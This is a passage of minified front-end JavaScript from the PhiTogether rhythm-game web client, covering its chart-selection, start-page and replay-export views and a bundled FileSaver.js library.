Lv."+toDisplayString$1(o.getDifficultyActual(d)),1)],4))),256))])])],12,_hoisted_22$5))),256))])):(openBlock(),createElementBlock("div",_hoisted_28$5,[(openBlock(!0),createElementBlock(Fragment,null,renderList(r.chartList.results,l=>(openBlock(),createElementBlock("div",{class:"scoreSongCard",onClick:d=>o.goDetails(l),style:{"margin-right":"0"}},[createBaseVNode("img",{src:o.imgCompLink(l.illustration.replace("res.phi.zone",r.selectChoice==="custom"?o.customChartServer:o.pzResUrlGlobal))},null,8,_hoisted_30$5),createBaseVNode("div",{class:"songCardCover",style:normalizeStyle({lineHeight:"1.2em","--bg":"url("+o.imgCompLink(l.illustration.replace("res.phi.zone",r.selectChoice==="custom"?o.customChartServer:o.pzResUrlGlobal))+")"})},[createBaseVNode("div",_hoisted_31$4,toDisplayString$1(l.name),1),_hoisted_32$4,createBaseVNode("div",_hoisted_33$5,toDisplayString$1(l.composer),1)],4)],8,_hoisted_29$5))),256))]))]),createBaseVNode("div",{id:"pageControl",style:normalizeStyle([{width:r.selectedSongData?"40vw":"84vw"},{"text-align":"center","font-size":"20px","line-height":"25px","margin-top":"10px"}])},[o.canPrev?(openBlock(),createElementBlock("a",{key:0,onClick:t[9]||(t[9]=l=>o.loadPrevPage())},"◀")):createCommentVNode("",!0),createTextVNode("   "),createBaseVNode("span",{onClick:t[10]||(t[10]=l=>o.goJustPageAsk()),style:{color:"black"}},toDisplayString$1(e.$t("chartSelect.pageCount",{page:r.page,pageAll:o.pageAll})),1),createTextVNode("   "),o.canNext?(openBlock(),createElementBlock("a",{key:1,onClick:t[11]||(t[11]=l=>o.loadNextPage())},"▶")):createCommentVNode("",!0)],4)]),r.selectedSongData?(openBlock(),createElementBlock("div",{key:0,id:"chartSelect",style:normalizeStyle({width:r.selectedSongData?"100%":"40vw"})},[r.selectedSongData?(openBlock(),createElementBlock("div",_hoisted_34$5,[createBaseVNode("div",_hoisted_35$4,[createBaseVNode("img",{src:r.selectedSongData.illustration.replace("res.phi.zone",o.pzResUrlGlobal),style:{"object-fit":"cover"}},null,8,_hoisted_36$3)]),createBaseVNode("div",_hoisted_37$3,[r.chartSelectorOpenedTab==="config"?(openBlock(),createElementBlock("a",{key:0,onClick:t[12]||(t[12]=l=>r.chartSelectorOpenedTab="chartSelect")},"  "+toDisplayString$1(e.$t("chartSelect.chartSelect")),1)):createCommentVNode("",!0),r.chartSelectorOpenedTab==="chartSelect"?(openBlock(),createElementBlock("a",{key:1,onClick:t[13]||(t[13]=l=>r.chartSelectorOpenedTab="config")},"  "+toDisplayString$1(e.$t("chartSelect.config")),1)):createCommentVNode("",!0),createBaseVNode("a",{onClick:t[14]||(t[14]=(...l)=>o.favourite&&o.favourite(...l))},"  "+toDisplayString$1(r.favouriteSongs.includes(r.selectedSongData.id)?e.$t("chartSelect.favourites.remove"):e.$t("chartSelect.favourites.add")),1),r.canEdit?(openBlock(),createElementBlock("a",{key:2,onClick:t[15]||(t[15]=(...l)=>o.edit&&o.edit(...l))},"   "+toDisplayString$1(e.$t("chartSelect.edit")),1)):createCommentVNode("",!0),r.canEdit?(openBlock(),createElementBlock("a",{key:3,onClick:t[16]||(t[16]=(...l)=>o.deleteChart&&o.deleteChart(...l))},"   "+toDisplayString$1(e.$t("chartSelect.delete")),1)):createCommentVNode("",!0)]),r.chartSelectorOpenedTab==="chartSelect"?(openBlock(),createElementBlock("div",_hoisted_38$3,[r.selectedSongData.charts.length?(openBlock(),createElementBlock("div",_hoisted_39$3,[(openBlock(!0),createElementBlock(Fragment,null,renderList(r.selectedSongData.charts,l=>(openBlock(),createElementBlock("div",{class:"scoreSongCard chartItem",style:normalizeStyle([{"margin-left":"5%",width:"90%",height:"30%",color:"black"},{minHeight:l.selected?"75px":"30px",background:l.selected?"#d6e9ff":"#00000016"}]),onClick:d=>o.selectChart(l)},[createBaseVNode("div",_hoisted_41$3,[createBaseVNode("div",_hoisted_42$3,[createBaseVNode("div",_hoisted_43$3,toDisplayString$1(l.level)+" Lv."+toDisplayString$1(o.getDifficultyActual(l))+" "+toDisplayString$1(l.ranked?"Ranked":""),1),createBaseVNode("div",_hoisted_44$3,toDisplayString$1(o.cleanStr(l.charter)),1)]),l.selected?(openBlock(),createElementBlock("div",_hoisted_45$3,[createBaseVNode("div",{style:normalizeStyle({flex:10,"margin-top":`${l.userScore[0][3]*20}px`})},[createBaseVNode("span",{style:normalizeStyle({color:l.userScore[0][1],"font-size":l.userScore[0][2]})},toDisplayString$1(l.userScore[0][0]),5)],4),createBaseVNode("div",_hoisted_46$3,[createBaseVNode("span",_hoisted_47$3,toDisplayString$1(l.userScore[1]),1),createBaseVNode("span",_hoisted_48$3,toDisplayString$1(l.userScore[2]),1)]),createBaseVNode("div",_hoisted_49$3,[o.isSingle&&e.hasAccount&&o.canFav?(openBlock(),createElementBlock("input",{key:0,type:"button",onClick:d=>o.toRank(l),value:e.$t("chartSelect.rankings")},null,8,_hoisted_50$3)):createCommentVNode("",!0),createBaseVNode("input",{type:"button",onClick:d=>o.loadChart(l),value:e.$t("chartSelect.select"),style:{"margin-right":"8px"}},null,8,_hoisted_51$3)])])):createCommentVNode("",!0)])],12,_hoisted_40$3))),256))])):(openBlock(),createElementBlock("div",_hoisted_52$3,toDisplayString$1(e.$t("chartSelect.thisSongHasNoPlayableCharts")),1))])):createCommentVNode("",!0),r.chartSelectorOpenedTab==="config"?(openBlock(),createElementBlock("div",_hoisted_53$3,[o.isMulti?createCommentVNode("",!0):(openBlock(),createElementBlock("div",_hoisted_54$2,[withDirectives(createBaseVNode("input",{type:"checkbox","onUpdate:modelValue":t[17]||(t[17]=l=>r.selectedPlayingSettings.mirror=l),id:"selectMirror"},null,512),[[vModelCheckbox,r.selectedPlayingSettings.mirror]]),createBaseVNode("label",_hoisted_55$2,toDisplayString$1(e.$t("chartSelect.playConfig.mirror")),1)])),o.isMulti?createCommentVNode("",!0):(openBlock(),createElementBlock("div",_hoisted_56$2,[withDirectives(createBaseVNode("input",{type:"checkbox","onUpdate:modelValue":t[18]||(t[18]=l=>r.selectedPlayingSettings.adjustOffset=l),id:"adjustOffset"},null,512),[[vModelCheckbox,r.selectedPlayingSettings.adjustOffset]]),createBaseVNode("label",_hoisted_57$2,toDisplayString$1(e.$t("chartSelect.playConfig.adjustOffset")),1)])),o.isMulti?createCommentVNode("",!0):(openBlock(),createElementBlock("div",_hoisted_58$2,[withDirectives(createBaseVNode("input",{type:"checkbox","onUpdate:modelValue":t[19]||(t[19]=l=>r.selectedPlayingSettings.previewMode=l),id:"previewMode"},null,512),[[vModelCheckbox,r.selectedPlayingSettings.previewMode]]),r.selectedPlayingSettings.adjustOffset?createCommentVNode("",!0):(openBlock(),createElementBlock("label",_hoisted_59$2,toDisplayString$1(e.$t("chartSelect.playConfig.previewMode")),1))])),o.isMulti?createCommentVNode("",!0):(openBlock(),createElementBlock("div",_hoisted_60$2,[r.selectedPlayingSettings.previewMode?createCommentVNode("",!0):withDirectives((openBlock(),createElementBlock("input",{key:0,type:"checkbox","onUpdate:modelValue":t[20]||(t[20]=l=>r.selectedPlayingSettings.practiseMode=l),id:"practiseMode"},null,512)),[[vModelCheckbox,r.selectedPlayingSettings.practiseMode]]),!r.selectedPlayingSettings.previewMode&&!r.selectedPlayingSettings.adjustOffset?(openBlock(),createElementBlock("label",_hoisted_61$2,toDisplayString$1(e.$t("chartSelect.playConfig.practiseMode")),1)):createCommentVNode("",!0)])),createBaseVNode("div",_hoisted_62$2,[withDirectives(createBaseVNode("input",{type:"checkbox","onUpdate:modelValue":t[21]||(t[21]=l=>r.selectedPlayingSettings.videoRecorder=l),id:"videoRecorder"},null,512),[[vModelCheckbox,r.selectedPlayingSettings.videoRecorder]]),createBaseVNode("label",_hoisted_63$1,toDisplayString$1(e.$t("chartSelect.playConfig.videoRecorder")),1)]),createBaseVNode("div",_hoisted_64$1,[createBaseVNode("span",null,toDisplayString$1(e.$t("chartSelect.playConfig.speed"))+" :  ",1),withDirectives(createBaseVNode("select",{"onUpdate:modelValue":t[22]||(t[22]=l=>r.selectedPlayingSettings.speed=l),style:{width:"4em",height:"30px","margin-top":"-.1em"}},[createBaseVNode("option",_hoisted_65$1,toDisplayString$1(e.$t("chartSelect.playConfig.speeds.slowest")),1),createBaseVNode("option",_hoisted_66$1,toDisplayString$1(e.$t("chartSelect.playConfig.speeds.slower")),1),createBaseVNode("option",_hoisted_67$1,toDisplayString$1(e.$t("chartSelect.playConfig.speeds.normal")),1),createBaseVNode("option",_hoisted_68$1,toDisplayString$1(e.$t("chartSelect.playConfig.speeds.faster")),1),createBaseVNode("option",_hoisted_69$1,toDisplayString$1(e.$t("chartSelect.playConfig.speeds.fastest")),1)],512),[[vModelSelect,r.selectedPlayingSettings.speed]])])])):createCommentVNode("",!0)])):createCommentVNode("",!0)],4)):createCommentVNode("",!0)],6)])):(openBlock(),createElementBlock("div",_hoisted_70$1,[createBaseVNode("p",_hoisted_71$1,toDisplayString$1(e.$t("multiplayer.multiWaitLoadChart")),1)]))}const ChartSelectPageComponent=_export_sfc(_sfc_main$f,[["render",_sfc_render$f]]),startpage_vue_vue_type_style_index_0_lang="",_sfc_main$e={name:"startPage",data(){return{ver:spec.thisVersion,verClicked:0,localeValue:""}},created(){this.localeValue=localStorage.getItem("ptlocale")||"zh-CN"},computed:{pzResUrlGlobal(){"res.phizone.cn"},loginInfo(){return shared$1.game.ptmain.gameConfig.account.userBasicInfo},loginStatus(){return!shared$1.game.ptmain.noAccountMode},isPTFun(){return[80,443,1443,"1443"].includes(location.port)||location.host.endsWith("phitogether.fun")},uiBlurPreference(){return!shared$1.game.ptmain.gameConfig.noUIBlur},userColor(){return shared$1.game.ptmain.userColor},mpMaintainanceStatus(){return JSON.parse("false")}},methods:{forcedFullscreen(){shared$1.game.requestFullscreen(!0)},toB20(){shared$1.game.ptmain.$router.push({path:"/playerB20",query:{id:this.loginInfo.id}})},async versionNumber(){if(!spec.isPhiTogetherApp&&(!this.loginStatus||!this.loginInfo.isPTDeveloper)&&this.to("/aboutpage"),this.verClicked++,this.verClicked==7){const e=await shared$1.game.msgHandler.prompt(this.$t("startPage.redirectToCustomURL"));e&&(e=="pd"&&this.loginStatus&&this.loginInfo.isPTDeveloper?(document.cookie=`i=${prompt("???")};Max-Age=1707109200;`,await caches.delete("PTv0-Main"),location.reload()):window.location.href=e),this.verClicked=0}},to(e){this.$router.push(e)},logIn(){this.to("/login")},async logOut(){await shared$1.game.msgHandler.confirm(this.$t("startPage.logoutConfirm"))&&(shared$1.game.ptmain.gameConfig.account={tokenInfo:null,userBasicInfo:null,defaultConfigID:null},shared$1.game.ptmain.noAccountMode=!0,shared$1.game.msgHandler.success(this.$t("startPage.logoutSuccessfully")))},checkIfCantPlay(){const e=!shared$1.game.ptmain.canplay;return e&&shared$1.game.msgHandler.sendMessage(this.$t("startPage.antiAddictionIssue"),"error"),e},async singleGame(){if(!this.checkIfCantPlay()){if(shared$1.game.ptmain.gameMode="single",!navigator.onLine){await shared$1.game.msgHandler.warning(this.$t("startPage.offlineNotice")),this.to({path:"/chartSelect",query:{offline:1}});return}if(shared$1.game.ptmain.noAccountMode&&await shared$1.game.msgHandler.confirm(this.loginInfo?this.$t("startPage.askForRelogin"):this.$t("startPage.askForLogin"))){this.loginInfo?this.reLogin():this.to({path:"/login"});return}this.to({path:"/chartSelect"})}},async multiGame(){if(!this.checkIfCantPlay()){if(JSON.parse("false")){shared$1.game.msgHandler.failure(this.$t("startPage.mpMaintainanceNotice"));return}if(!navigator.onLine){shared$1.game.msgHandler.failure(this.$t("startPage.offlineMPNotice"));return}if(shared$1.game.ptmain.noAccountMode){shared$1.game.msgHandler.failure(this.$t("startPage.noaccountmodeMPNotice")),this.loginInfo?this.reLogin():this.to({path:"/login"});return}try{shared$1.game.loadHandler.l(this.$t("startPage.loadingUserConfig"),"multiGetJudg");const e=await PhiZoneAPI.getSpecConfiguration(shared$1.game.ptmain.gameConfig.account.tokenInfo.access_token,shared$1.game.ptmain.gameConfig.account.defaultConfigID);if(shared$1.game.loadHandler.r("multiGetJudg"),e.goodJudgment!=160||e.perfectJudgment!=80){shared$1.game.msgHandler.failure(this.$t("startPage.judgeRangeMPNotice"));return}if(shared$1.game.ptmain.gameConfig.fullScreenJudge){shared$1.game.msgHandler.failure(this.$t("startPage.fullscreenjudgeMPNotice"));return}}catch{shared$1.game.loadHandler.r("multiGetJudg"),shared$1.game.msgHandler.sendMessage(this.$t("startPage.errLoadingUserConfig"),"error");return}if(localStorage.lastMultiInfo)if(await shared$1.game.msgHandler.confirm(this.$t("startPage.restoreMP"))){const e=JSON.parse(localStorage.lastMultiInfo);try{if(shared$1.game.loadHandler.l(this.$t("startPage.recoverMP"),"recoverMulti"),(await(await fetch(`https://mpcenter.phitogether.fun/api/multi/requestRoom/${e.room.id}?v=${spec.thisVersion}`)).json()).code===-2){shared$1.game.loadHandler.r("recoverMulti"),await shared$1.game.msgHandler.warning(this.$t("startPage.recoverMPFailed")),localStorage.removeItem("lastMultiInfo");return}else shared$1.game.multiInstance.recoverMulti(e)}catch{shared$1.game.loadHandler.r("recoverMulti"),shared$1.game.msgHandler.warning(this.$t("startPage.recoverMPNetProblem"))}return}else localStorage.removeItem("lastMultiInfo");this.to({path:"/multiIndex"})}},reLogin(){shared$1.game.ptmain.pzRefreshLogin()},async switchLocale(){localStorage.setItem("ptlocale",this.localeValue),await shared$1.game.msgHandler.confirm("语言更改需要刷新页面生效，现在刷新吗？/ Language change requires a reload to take effect. Reload now?")&&location.reload()}}},_hoisted_1$e={id:"startPage",class:"routerRealPage"},_hoisted_2$d={id:"flexCol"},_hoisted_3$d={class:"startPageRow"},_hoisted_4$c={key:0,style:{"margin-bottom":"20px"}},_hoisted_5$c={id:"playerCardActions"},_hoisted_6$c={id:"playerCardUsrAvatarParent",style:{"padding-top":"10px"}},_hoisted_7$b=["src"],_hoisted_8$b={id:"playerCardUsrName"},_hoisted_9$a=createBaseVNode("br",null,null,-1),_hoisted_10$9={id:"playerCardUsrInfo"},_hoisted_11$9={style:{color:"green"}},_hoisted_12$8={key:0},_hoisted_13$8=createBaseVNode("b",{style:{color:"DeepSkyBlue"}},"DEVELOPER",-1),_hoisted_14$7={key:1},_hoisted_15$6=createBaseVNode("b",{style:{color:"DarkOrange"}},"OFFLINE",-1),_hoisted_16$6=[_hoisted_15$6],_hoisted_17$6={key:2},_hoisted_18$6={key:3},_hoisted_19$5=createBaseVNode("br",null,null,-1),_hoisted_20$4=createBaseVNode("br",null,null,-1),_hoisted_21$4=createBaseVNode("br",null,null,-1),_hoisted_22$4=createBaseVNode("br",null,null,-1),_hoisted_23$4=createBaseVNode("br",null,null,-1),_hoisted_24$4=createBaseVNode("br",null,null,-1),_hoisted_25$4={id:"playerCardActions"},_hoisted_26$4={id:"playerCardUsrAvatarParent"},_hoisted_27$4=createBaseVNode("img",null,null,-1),_hoisted_28$4=[_hoisted_27$4],_hoisted_29$4={id:"playerCardUsrName"},_hoisted_30$4=createStaticVNode('<br><div id="playerCardUsrInfo"> PhiZone <b style="color:green;">GUEST</b><br><br><br> ID <b>--</b>  EXP <b>---</b><br> RKS <b>--.---</b><br><br> LAST LOGIN<br><b>----.--.-- --:--:--</b></div><br>',3),_hoisted_33$4=createBaseVNode("br",null,null,-1),_hoisted_34$4={id:"flexCol2",style:{"margin-top":"-15px"}},_hoisted_35$3={class:"startPageRow"},_hoisted_36$2=createBaseVNode("br",null,null,-1),_hoisted_37$2=["value"],_hoisted_38$2={class:"startPageRow"},_hoisted_39$2=["value"],_hoisted_40$2={class:"startPageRow startPageRow2"},_hoisted_41$2=["value"],_hoisted_42$2=["value"],_hoisted_43$2=createBaseVNode("br",null,null,-1),_hoisted_44$2={class:"startPageRow"},_hoisted_45$2=["value"],_hoisted_46$2=createBaseVNode("br",null,null,-1),_hoisted_47$2={style:{"z-index":"1688"}},_hoisted_48$2={style:{"padding-bottom":"5px"}},_hoisted_49$2=createBaseVNode("option",{value:"zh_CN"},"简体中文",-1),_hoisted_50$2=createBaseVNode("option",{value:"en_US"},"English",-1),_hoisted_51$2=[_hoisted_49$2,_hoisted_50$2],_hoisted_52$2={href:"https://status.phitogether.fun"},_hoisted_53$2=createBaseVNode("br",null,null,-1);function _sfc_render$e(e,t,n,s,r,o){return openBlock(),createElementBlock("div",_hoisted_1$e,[createBaseVNode("div",_hoisted_2$d,[createBaseVNode("div",_hoisted_3$d,[createBaseVNode("div",{id:"playerCard",class:normalizeClass({blur:o.uiBlurPreference})},[o.loginInfo?(openBlock(),createElementBlock("div",_hoisted_4$c,[createBaseVNode("div",_hoisted_5$c,[o.loginStatus?(openBlock(),createElementBlock("span",{key:0,onClick:t[0]||(t[0]=l=>o.toB20())},toDisplayString$1(e.$t("startPage.viewB20")),1)):(openBlock(),createElementBlock("span",{key:1,onClick:t[1]||(t[1]=l=>o.reLogin())},toDisplayString$1(e.$t("startPage.retryLogin")),1)),createTextVNode("    "),createBaseVNode("span",{onClick:t[2]||(t[2]=l=>o.logIn())},toDisplayString$1(e.$t("startPage.switch")),1),createTextVNode("   "),createBaseVNode("span",{onClick:t[3]||(t[3]=l=>o.logOut())},toDisplayString$1(e.$t("startPage.logout")),1)]),createBaseVNode("div",_hoisted_6$c,[o.loginInfo&&o.loginInfo.avatar?(openBlock(),createElementBlock("div",{key:0,id:"playerCardUsrAvatar",style:normalizeStyle({"border-color":o.userColor})},[createBaseVNode("img",{src:o.loginInfo.avatar.replace("res.phi.zone",o.pzResUrlGlobal)},null,8,_hoisted_7$b)],4)):createCommentVNode("",!0)]),createBaseVNode("div",_hoisted_8$b,toDisplayString$1(o.loginInfo.userName)+"   ",1),_hoisted_9$a,createBaseVNode("div",_hoisted_10$9,[createTextVNode(" PhiZone "),createBaseVNode("b",_hoisted_11$9,toDisplayString$1(o.loginInfo.role.toUpperCase()),1),o.loginInfo.isPTDeveloper?(openBlock(),createElementBlock("div",_hoisted_12$8,[createTextVNode(" PhiTogether "),_hoisted_13$8])):createCommentVNode("",!0),o.loginStatus?(openBlock(),createElementBlock("br",_hoisted_17$6)):(openBlock(),createElementBlock("div",_hoisted_14$7,_hoisted_16$6)),o.loginInfo.isPTDeveloper?createCommentVNode("",!0):(openBlock(),createElementBlock("br",_hoisted_18$6)),_hoisted_19$5,createTextVNode(" ID "),createBaseVNode("b",null,toDisplayString$1(o.loginInfo.id),1),createTextVNode("  EXP "),createBaseVNode("b",null,toDisplayString$1(o.loginInfo.experience.toFixed(0)),1),_hoisted_20$4,createTextVNode(" RKS "),createBaseVNode("b",null,toDisplayString$1(o.loginInfo.rks.toFixed(3)),1),_hoisted_21$4,_hoisted_22$4,createTextVNode(" LAST LOGIN"),_hoisted_23$4,createBaseVNode("b",null,toDisplayString$1(o.loginInfo.dateLastLoggedIn.replace("T"," ").slice(0,16)),1)]),_hoisted_24$4])):(openBlock(),createElementBlock("div",{key:1,onClick:t[5]||(t[5]=l=>o.logIn()),style:{"margin-bottom":"20px"}},[createBaseVNode("div",_hoisted_25$4,[createBaseVNode("span",{onClick:t[4]||(t[4]=l=>o.logIn())},toDisplayString$1(e.$t("startPage.login")),1),createTextVNode("   ")]),createBaseVNode("div",_hoisted_26$4,[createBaseVNode("div",{id:"playerCardUsrAvatar",style:normalizeStyle({"border-color":o.userColor})},_hoisted_28$4,4)]),createBaseVNode("div",_hoisted_29$4,toDisplayString$1(e.$t("startPage.unLogined"))+"  ",1),_hoisted_30$4]))],2)])]),_hoisted_33$4,createBaseVNode("div",_hoisted_34$4,[createBaseVNode("div",_hoisted_35$3,[_hoisted_36$2,createBaseVNode("input",{class:normalizeClass({blur:o.uiBlurPreference,startBtn:!0,"btn-smooth":!0}),type:"button",value:e.$t("startPage.singleGame"),onClick:t[6]||(t[6]=l=>o.singleGame())},null,10,_hoisted_37$2)]),createBaseVNode("div",_hoisted_38$2,[createBaseVNode("input",{class:normalizeClass({blur:o.uiBlurPreference,startBtn:!0,"btn-smooth":!0,forbidden:o.mpMaintainanceStatus}),type:"button",value:e.$t("startPage.multiGame"),onClick:t[7]||(t[7]=l=>o.multiGame())},null,10,_hoisted_39$2)]),createBaseVNode("div",_hoisted_40$2,[createBaseVNode("input",{class:normalizeClass({blur:o.uiBlurPreference,startBtn:!0,"btn-smooth":!0}),type:"button",value:e.$t("startPage.caches"),onClick:t[8]||(t[8]=l=>o.to("/cacheManage"))},null,10,_hoisted_41$2),createBaseVNode("input",{class:normalizeClass({blur:o.uiBlurPreference,startBtn:!0,"btn-smooth":!0}),type:"button",value:e.$t("startPage.replay"),onClick:t[9]||(t[9]=l=>o.to("/replayPage"))},null,10,_hoisted_42$2)]),_hoisted_43$2,createBaseVNode("div",_hoisted_44$2,[createBaseVNode("input",{class:normalizeClass({blur:o.uiBlurPreference,startBtn:!0,"btn-smooth":!0}),type:"button",value:e.$t("startPage.gameSettings"),onClick:t[10]||(t[10]=l=>o.to("/settings"))},null,10,_hoisted_45$2)]),_hoisted_46$2]),createBaseVNode("footer",_hoisted_47$2,[createBaseVNode("div",_hoisted_48$2,[createTextVNode("语言 / Language: "),withDirectives(createBaseVNode("select",{"onUpdate:modelValue":t[11]||(t[11]=l=>r.localeValue=l),onChange:t[12]||(t[12]=(...l)=>o.switchLocale&&o.switchLocale(...l))},_hoisted_51$2,544),[[vModelSelect,r.localeValue]])]),createBaseVNode("a",{onClick:t[13]||(t[13]=l=>o.to("/aboutPage"))},[createBaseVNode("b",null,toDisplayString$1(e.$t("startPage.about")),1)]),createTextVNode("  |  "),createBaseVNode("a",_hoisted_52$2,[createBaseVNode("b",null,toDisplayString$1(e.$t("startPage.serviceStatus")),1)]),createTextVNode("  |  "),createBaseVNode("a",{onClick:t[14]||(t[14]=l=>o.to("/changelogs"))},[createBaseVNode("b",null,toDisplayString$1(e.$t("startPage.updateLogs")),1)]),createTextVNode("  |  "),createBaseVNode("a",{onClick:t[15]||(t[15]=(...l)=>o.forcedFullscreen&&o.forcedFullscreen(...l))},[createBaseVNode("b",null,toDisplayString$1(e.$t("startPage.forcedFullscreen")),1)]),_hoisted_53$2,createBaseVNode("span",{onClick:t[16]||(t[16]=l=>o.versionNumber())},"PhiTogether "+toDisplayString$1(r.ver)+" - © 2024 Team PhiTogether",1)])])}const StartPageComponent=_export_sfc(_sfc_main$e,[["render",_sfc_render$e]]),recordMgr={data:{},playerInfo:{avatar:"https://res.phi.zone/user/default.webp",username:"PTPlayer",id:-1},chartInfo:{},reset(e){if(this.data={},e){const{avatar:t,userName:n,id:s}=e;this.playerInfo={avatar:t,userName:n,id:s}}return this},export(){const e={data:this.data,chartInfo:this.chartInfo,playerInfo:this.playerInfo},t={data:this.data,chartInfo:encodeURIComponent(JSON.stringify(this.chartInfo)),playerInfo:encodeURIComponent(JSON.stringify(this.playerInfo))},n=JSON.stringify(t),s=md5$1(n);return[btoa(n)+s,e]},add(e){if(e.statOffset||e.holdStart){if([2,4].includes(e.type)){this.data[e.name]=!0;return}this.data[e.name]={s:e[e.type===3?"holdStart":"statOffset"]-e.realTime,a:e[e.type===3?"holdStatus":"status"]},e.type===3&&(this.data[e.name].q=e.status),e.type===3&&e.brokenTime&&(this.data[e.name].e=e.brokenTime-e.realTime)}},get stdDeviation(){return(Math.standardDeviation(function(e){const t=[];for(const n in e)(n.endsWith("t")||n.endsWith("h"))&&t.push(e[n].s);return t}(this.data))*1e3).toFixed(3)}};var FileSaver_min={exports:{}};(function(e,t){(function(n,s){s()})(commonjsGlobal,function(){function n(f,m){return typeof m>"u"?m={autoBom:!1}:typeof m!="object"&&(console.warn("Deprecated: Expected third argument to be a object"),m={autoBom:!m}),m.autoBom&&/^\s*(?:text\/\S*|application\/xml|\S*\/\S*\+xml)\s*;.*charset\s*=\s*utf-8/i.test(f.type)?new Blob(["\uFEFF",f],{type:f.type}):f}function s(f,m,g){var y=new XMLHttpRequest;y.open("GET",f),y.responseType="blob",y.onload=function(){u(y.response,m,g)},y.onerror=function(){console.error("could not download file")},y.send()}function r(f){var m=new XMLHttpRequest;m.open("HEAD",f,!1);try{m.send()}catch{}return 200<=m.status&&299>=m.status}function o(f){try{f.dispatchEvent(new MouseEvent("click"))}catch{var m=document.createEvent("MouseEvents");m.initMouseEvent("click",!0,!0,window,0,0,0,80,20,!1,!1,!1,!1,0,null),f.dispatchEvent(m)}}var l=typeof window=="object"&&window.window===window?window:typeof self=="object"&&self.self===self?self:typeof commonjsGlobal=="object"&&commonjsGlobal.global===commonjsGlobal?commonjsGlobal:void 0,d=l.navigator&&/Macintosh/.test(navigator.userAgent)&&/AppleWebKit/.test(navigator.userAgent)&&!/Safari/.test(navigator.userAgent),u=l.saveAs||(typeof window!="object"||window!==l?function(){}:"download"in HTMLAnchorElement.prototype&&!d?function(f,m,g){var y=l.URL||l.webkitURL,v=document.createElement("a");m=m||f.name||"download",v.download=m,v.rel="noopener",typeof f=="string"?(v.href=f,v.origin===location.origin?o(v):r(v.href)?s(f,m,g):o(v,v.target="_blank")):(v.href=y.createObjectURL(f),setTimeout(function(){y.revokeObjectURL(v.href)},4e4),setTimeout(function(){o(v)},0))}:"msSaveOrOpenBlob"in navigator?function(f,m,g){if(m=m||f.name||"download",typeof f!="string")navigator.msSaveOrOpenBlob(n(f,g),m);else if(r(f))s(f,m,g);else{var y=document.createElement("a");y.href=f,y.target="_blank",setTimeout(function(){o(y)})}}:function(f,m,g,y){if(y=y||open("","_blank"),y&&(y.document.title=y.document.body.innerText="downloading..."),typeof f=="string")return s(f,m,g);var v=f.type==="application/octet-stream",x=/constructor/i.test(l.HTMLElement)||l.safari,E=/CriOS\/[\d]+/.test(navigator.userAgent);if((E||v&&x||d)&&typeof FileReader<"u"){var S=new FileReader;S.onloadend=function(){var C=S.result;C=E?C:C.replace(/^data:[^;]*;/,"data:attachment/file;"),y?y.location.href=C:location=C,y=null},S.readAsDataURL(f)}else{var w=l.URL||l.webkitURL,k=w.createObjectURL(f);y?y.location=k:location.href=k,y=null,setTimeout(function(){w.revokeObjectURL(k)},4e4)}});l.saveAs=u.saveAs=u,e.exports=u})})(FileSaver_min);var FileSaver_minExports=FileSaver_min.exports;const saveAs=getDefaultExportFromCjs(FileSaver_minExports),_sfc_main$d={name:"playing",data(){return{playFinished:!1,downloadUrl:!1}},computed:{qrcodesrc(){return this.downloadUrl?"https://proxy.phitogether.fun/qrc/?text="+this.downloadUrl:null},uiBlurPreference(){return!shared.game.ptmain.gameConfig.noUIBlur}},mounted(){this.playFinished=!1,recordMgr.reset(),shared.game.isPlayFinished=()=>this.playFinished,shared.game.finishToRecord=()=>{this.playFinished=!0},shared.game.exportRecord=this.exportRecord,shared.game.restartClearRecord=()=>{this.playFinished=this.downloadUrl=!1}},activated(){shared.game.simphi.stage.style.display="block"},deactivated(){shared.game.simphi.stage.style.display="none"},methods:{exportRecord(){const[e,t]=recordMgr.export(),n=new Blob([e],{type:"application/json"});if(window.spec.isPhiTogetherApp&&!window.nativeApi){shared.game.msgHandler.sendMessage("正在生成下载链接(实验性功能)");const s=new FormData;s.append("text",e),s.append("filename",encodeURI(`${t.chartInfo.songData.name}${t.chartInfo.chartData.level}${t.chartInfo.chartData.difficulty}-${t.playerInfo.userName}-${new Date().format("YmdHis")}.ptr`)),fetch("https://api.phitogether.realtvop.eu.org/record/upload",{method:"POST",body:s}).then(r=>r.text()).then(r=>{this.downloadUrl=r,navigator.clipboard&&navigator.clipboard.writeText(this.downloadUrl)}).catch(function(r){shared.game.msgHandler.sendMessage(r,"error"),shared.game.msgHandler.sendMessage("生成下载链接失败,请重试","error"),console.log(r)})}else(window.nativeApi?window.nativeApi.saveAs.bind(window.nativeApi):saveAs)(window.nativeApi?e:n,`${t.chartInfo.songData.name}${t.chartInfo.chartData.level}${t.chartInfo.chartData.difficulty}-${t.playerInfo.username}-${new Date().format("YmdHis")}.ptr`)}}},_hoisted_1$d={id:"cacheManage",class:"routerRealPage"},_hoisted_2$c=createBaseVNode("h3",null,"导出游玩回放",-1),_hoisted_3$c={key:0},_hoisted_4$b=createBaseVNode("p",null,"游玩回放已生成，点击下方按钮导出游玩回放",-1),_hoisted_5$b=createBaseVNode("br",null,null,-1),_hoisted_6$b={key:1,style:{display:"flex",width:"100%"}},_hoisted_7$a=["src"],_hoisted_8$a={style:{display:"block","overflow-wrap":"anywhere","text-align":"left","margin-left":"1%"}},_hoisted_9$9=createBaseVNode("h3",null,"链接已复制",-1),_hoisted_10$8=createBaseVNode("br",null,null,-1),_hoisted_11$8=createBaseVNode("br",null,null,-1),_hoisted_12$7=createBaseVNode("h4",null,"也可扫描左侧二维码",-1),_hoisted_13$7=createBaseVNode("br",null,null,-1);function _sfc_render$d(e,t,n,s,r,o){return openBlock(),createElementBlock("div",_hoisted_1$d,[r.playFinished?(openBlock(),createElementBlock("div",{key:0,class:normalizeClass({cacheUnit:!0,blur:o.uiBlurPreference,display:"none"}),style:{padding:"10px"}},[_hoisted_2$c,r.downloadUrl?(openBlock(),createElementBlock("div",_hoisted_6$b,[createBaseVNode("img",{src:o.qrcodesrc},null,8,_hoisted_7$a),createBaseVNode("div",_hoisted_8$a,[_hoisted_9$9,createTextVNode(" 请在浏览器中粘贴打开 若未复制成功请手动输入: "),_hoisted_10$8,createTextVNode(" "+toDisplayString$1(r.downloadUrl),1),_hoisted_11$8,_hoisted_12$7])])):(openBlock(),createElementBlock("div",_hoisted_3$c,[_hoisted_4$b,createBaseVNode("input",{type:"button",value:"导出",onClick:t[0]||(t[0]=l=>o.exportRecord())}),_hoisted_5$b]))],2)):createCommentVNode("",!0),_hoisted_13$7])}const PlayingPageComponent=_export_sfc(_sfc_main$d,[["render",_sfc_render$d]]),TapTapApi={loginWithTapTap(){const e=window;return 